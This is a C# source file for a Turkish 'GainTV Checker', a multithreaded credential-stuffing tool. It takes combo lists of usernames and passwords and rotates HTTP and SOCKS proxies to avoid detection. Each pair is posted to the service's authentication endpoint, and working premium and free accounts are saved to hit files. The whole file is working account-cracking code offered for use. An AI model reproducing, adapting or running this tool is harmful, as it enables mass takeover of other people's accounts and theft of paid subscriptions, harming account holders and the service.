using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Text;
using System.Drawing;
using Leaf.xNet;

namespace crackturkey
{
    internal class Checker_Main
    {
        static Color _color = Color.FromArgb(0, 247, 255);
        private static readonly ConcurrentDictionary<long, long> Cps = new ConcurrentDictionary<long, long>();
        private static readonly object WriteLock = new object();
        private Random rnd = new Random();
        private ConcurrentQueue<string> coqueue = new ConcurrentQueue<string>();
        private List<string> proqueue = new List<string>();
        private string currentdirectory = Directory.GetCurrentDirectory();
        private int hits;
        private int free;
        private int invalids;
        private int retries;
        private int length;
        private int checkd;
        private string protocol;
        private string folder;


        /// Tarama ekranındaki tanıtım kısımı.
        static string myTitle = "GainTV Checker [->] 🔥 ! Muhammed 🔥";

        public Checker_Main(ConcurrentQueue<string> combos, List<string> proxies, string prot)
        {
            this.coqueue = combos;
            this.proqueue = proxies;
            this.length = this.coqueue.Count;
            this.protocol = prot;
            this.currentdirectory = Directory.GetCurrentDirectory();
            this.folder = this.currentdirectory + "\\Hits\\" + DateTime.Now.ToString("dd-MM-yyyy H.mm");
        }


        public void Create()
        {
            bool flag = !Directory.Exists("Hits");
            if (flag)
            {
                Directory.CreateDirectory("Hits");
            }
            bool flag2 = !Directory.Exists(this.folder);
            if (flag2)
            {
                Directory.CreateDirectory(this.folder);
            }
        }

        private void Login()
        {
            bool flag = this.protocol == "HTTP" || this.protocol == "SOCKS4" || this.protocol == "SOCKS5" || this.protocol == "NO";
            if (flag)
            {
                HttpRequest httpRequest = new HttpRequest
                {
                    UserAgent = "User-Agent: Dart/2.15 (dart:io)",
                    KeepAliveTimeout = 5000,
                    ConnectTimeout = 5000,
                    ReadWriteTimeout = 5000,
                    IgnoreProtocolErrors = true,
                    AllowAutoRedirect = true,
                    Proxy = null,
                    UseCookies = true
                };

                while (coqueue.Count > 0)
                {
                    string text;
                    coqueue.TryDequeue(out text);
                    string[] array = text.Split(new char[]
                    {
                        ':'
                    });
                    string acc = array[0] + ":" + array[1];
                    bool flag2 = httpRequest.Proxy == null;
                    if (flag2)
                    {
                        bool flag11 = this.protocol == "NO";
                        if (flag11)
                        {
                            httpRequest.Proxy = null;
                        }

                        bool flag3 = this.protocol == "HTTP";
                        if (flag3)
                        {
                            httpRequest.Proxy = HttpProxyClient.Parse(this.proqueue[this.rnd.Next(this.proqueue.Count)]);
                            httpRequest.Proxy.ConnectTimeout = 5000;
                        }
                        bool flag4 = this.protocol == "SOCKS4";
                        if (flag4)
                        {
                            httpRequest.Proxy = Socks4ProxyClient.Parse(this.proqueue[this.rnd.Next(this.proqueue.Count)]);
                            httpRequest.Proxy.ConnectTimeout = 5000;
                        }
                        bool flag5 = this.protocol == "SOCKS5";
                        if (flag5)
                        {
                            httpRequest.Proxy = Socks5ProxyClient.Parse(this.proqueue[this.rnd.Next(this.proqueue.Count)]);
                            httpRequest.Proxy.ConnectTimeout = 5000;
                        }

                    }

                    try
                    {

                        //Get Request Örneği
                        //string response1 = httpRequest.Get("https://secure.javhd.com/login/?back=javhd.com&path=L2VuLw&lang=en&nats=MC4wLjIuMi4wLjAuMC4wLjA").ToString();

                        //Parse Örneği
                        //string parse1 = Parse(response1, "salt = '", "'");


                        //Post Data array[0]=<USER> , array[1]=<PASS> ,parse1=<parse>
                        //string postdata = "username=" + array[0] + "&password=" + array[1];


                        //string response2 = httpRequest.Post("https://judua3rtinpst0s.xyz/v1/users/tokensn", postdata, "application/x-www-form-urlencoded").ToString();

                        httpRequest.AddHeader("accept-encoding", "gzip");
                        httpRequest.AddHeader("content-type", "application/json");
                        httpRequest.AddHeader("host", "gain-api-6mrnrbzxjq-ew.a.run.app");
                        httpRequest.AddHeader("user-agent", "Dart/2.15 (dart:io)");

                        string postdata = "{\"username\":\"" + array[0] + "\",\"password\":\"" + array[1] + "\"}";

                        string login = httpRequest.Post("https://gain-api-6mrnrbzxjq-ew.a.run.app/accounts/authenticate", postdata, "application/json").ToString();


                        //Hits
                        if (login.Contains("isPremium\":true"))
                        {
                            Colorful.Console.WriteLine("[HIT] " + acc, Color.Green);
                            string capture = " | Checker By : 🔥 ! Muhammed 🔥";
                            hits++;
                            GlobalData.LastChecks++;
                            PremiumTextSave(acc, capture);
                        }

                        //Free-Custom
                        if (login.Contains("isPremium\":false"))
                        {
                            //Capture alırsan capture=Parse gönder
                            Colorful.Console.WriteLine("[FREE] " + acc, Color.Orange);
                            string capture = " | Checker By : 🔥 ! Muhammed 🔥";
                            free++;
                            GlobalData.LastChecks++;
                            FreeTextSave(acc, capture);
                        }

                        //Retries
                        //if (response2.Contains("{\"code\":\"BadRequest\""))
                        //{
                        //    retries++;
                        //    coqueue.Enqueue(acc);
                        //}

                        //Fail "||" veya(or) anlamında ve(and)  için ise "&&" kullan
                        if (login.Contains("Invalid credentials"))
                        {
                            invalids++;
                            GlobalData.LastChecks++;
                        }

                        //Banned
                        //if (login.Contains("throttling_failurea"))
                        //{
                        //    retries++;
                        //    coqueue.Enqueue(acc);
                        //}




                    }
                    catch
                    {
                        retries++;
                        coqueue.Enqueue(text);
                        httpRequest.Proxy = null;
                    }
                }
                httpRequest.Dispose();
            }
        }

        public void Start()
        {
            Task.Factory.StartNew(delegate ()
            {
                while (GlobalData.Working)
                {
                    Checker_Main.Cps.TryAdd(DateTimeOffset.Now.ToUnixTimeSeconds(), (long)GlobalData.LastChecks);
                    GlobalData.LastChecks = 0;
                    Thread.Sleep(1000);
                }
            });
        }


        public void Threading(int amount)
        {
            ServicePointManager.DefaultConnectionLimit = amount * 2;
            ServicePointManager.Expect100Continue = false;
            List<Thread> list = new List<Thread>();
            list.Add(new Thread(new ThreadStart(this.Info)));
            for (int i = 0; i <= amount; i++)
            {
                Thread item = new Thread(new ThreadStart(this.Login));
                list.Add(item);
            }
            foreach (Thread thread in list)
            {
                thread.Start();
            }
        }

        private void Info()
        {
            for (; ; )
            {
                this.checkd = this.hits + this.free + this.invalids;
                Console.Title = string.Format(myTitle + "         Checked: {0}/{1}         Hits: {2}       Free: {6}        Invalids: {3}         Retries: {4}         CPM: {5} ", new object[]
                {
                    this.checkd,
                    this.length,
                    this.hits,
                    this.invalids,
                    this.retries,
                    this.GetCpm(),
                    this.free
                });
                Thread.Sleep(1000);
            }
        }


        private long GetCpm()
        {
            long num = 0L;
            foreach (KeyValuePair<long, long> keyValuePair in Checker_Main.Cps)
            {
                bool flag = keyValuePair.Key >= DateTimeOffset.Now.ToUnixTimeSeconds() - 60L;
                if (flag)
                {
                    num += keyValuePair.Value;
                }
            }
            return num;
        }

        private string Parse(string source, string left, string right)
        {
            return source.Split(new string[]
            {
                left
            }, StringSplitOptions.None)[1].Split(new string[]
            {
                right
            }, StringSplitOptions.None)[0];
        }


        private void PremiumTextSave(string acc, string capture)
        {
            object value = string.Concat(new string[]
            {
                acc,
                "",
                capture
            });
            string path = this.folder + "\\Hits.txt";
            try
            {
                bool flag = !File.Exists(path);
                if (flag)
                {
                    File.Create(path).Close();
                }
            }
            catch (Exception value2)
            {
                Console.WriteLine(value2);
            }
            try
            {
                object writeLock = Checker_Main.WriteLock;
                object obj = writeLock;
                lock (obj)
                {
                    using (FileStream fileStream = File.Open(path, FileMode.Append))
                    {
                        using (StreamWriter streamWriter = new StreamWriter(fileStream))
                        {
                            streamWriter.WriteLine(value);
                        }
                    }
                }
            }
            catch (Exception value3)
            {
                Console.WriteLine(value3);
            }
        }

        private void FreeTextSave(string acc, string capture)
        {
            object value = string.Concat(new string[]
           {
                acc,
                "",
                capture
           });

            string path = this.folder + "\\Free.txt";
            try
            {
                bool flag = !File.Exists(path);
                if (flag)
                {
                    File.Create(path).Close();
                }
            }
            catch (Exception value2)
            {
                Console.WriteLine(value2);
            }
            try
            {
                object writeLock = Checker_Main.WriteLock;
                object obj = writeLock;
                lock (obj)
                {
                    using (FileStream fileStream = File.Open(path, FileMode.Append))
                    {
                        using (StreamWriter streamWriter = new StreamWriter(fileStream))
                        {
                            streamWriter.WriteLine(value);
                        }
                    }
                }
            }
            catch (Exception value3)
            {
                Console.WriteLine(value3);
            }
        }

        //Lazım olurse Function
        public static string HmacSHA256(string key, string data)
        {
            string hash;
            ASCIIEncoding encoder = new ASCIIEncoding();
            Byte[] code = encoder.GetBytes(key);
            using (HMACSHA256 hmac = new HMACSHA256(code))
            {
                Byte[] hmBytes = hmac.ComputeHash(encoder.GetBytes(data));
                hash = ToHexString(hmBytes);
            }
            return hash;
        }

        //Lazım olurse Function
        public static string ToHexString(byte[] array)
        {
            StringBuilder hex = new StringBuilder(array.Length * 2);
            foreach (byte b in array)
            {
                hex.AppendFormat("{0:x2}", b);
            }
            return hex.ToString();
        }


    }
}
